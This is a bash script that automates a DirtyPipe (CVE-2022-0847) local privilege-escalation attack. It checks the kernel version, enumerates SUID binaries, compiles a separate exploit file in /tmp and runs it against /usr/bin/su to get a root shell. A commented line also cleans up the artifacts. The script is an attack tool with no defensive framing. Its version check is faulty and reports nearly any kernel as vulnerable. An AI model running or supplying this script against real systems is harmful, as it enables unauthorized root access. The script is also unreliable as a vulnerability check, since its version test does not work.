#!/bin/bash
#
# DirtyPipe (CVE-2022-0847) Privilege Escalation

# Array containing non-vulnerable/patched kernel versions
notvulnerable=(4.9 5.8 5.10.102 5.14.10 5.15.25 5.15.34 5.16.11 5.16.12 5.17)

# Get kernel version of system
echo "[*] Checking if kernel version is vulnerable to DirtyPipe..."
kernel_version=$(uname -r | cut -d '-' -f1)
echo "[*] Kernel version = $kernel_version"

# Checks if the kernel version is vulnerable to DirtyPipe
if [[ "${notvulnerable[*]}" = $kernel_version ]]; 
    then
        # If not vulnerable, terminate the script
        echo "[!] This kernel version is not vulnerable to DirtyPipe! Terminating script..."
        exit 0
    else
        echo "[+] This kernel version is vulnerable to DirtyPipe!"

        # Checks if /usr/bin/su has SUID bit set
        echo "[*] Checking if SUID bit is set on /usr/bin/su..."
        if [[ "$(find / -perm -4000 2>/dev/null)" =~ "/usr/bin/su" ]];
            then
                echo "[+] SUID bit is set on /usr/bin/su!"
                
                # Compile exploit and set execute permission on the executable
                echo "[*] Compiling exploit..."
                cd /tmp && gcc CVE-2022-0847.c -o CVE-2022-0847
                chmod +x CVE-2022-0847
                echo "[+] Exploit successfully compiled and execute permission set!"

                # Execute the exploit to get a root shell.
                echo "[*] Executing the DirtyPipe exploit..."
                ./CVE-2022-0847 /usr/bin/su
                # echo "whoami && rm /tmp/sh /tmp/CVE-2022-0847.c /tmp/CVE-2022-0847" | ./CVE-2022-0847 /usr/bin/su
                # echo "[+] All commands have been executed!"

            else
                # If SUID bit is not set on /usr/bin/su, terminate the script
                echo "[!] SUID bit is not set on /usr/bin/su! Terminating script..."
                exit 0
        fi
fi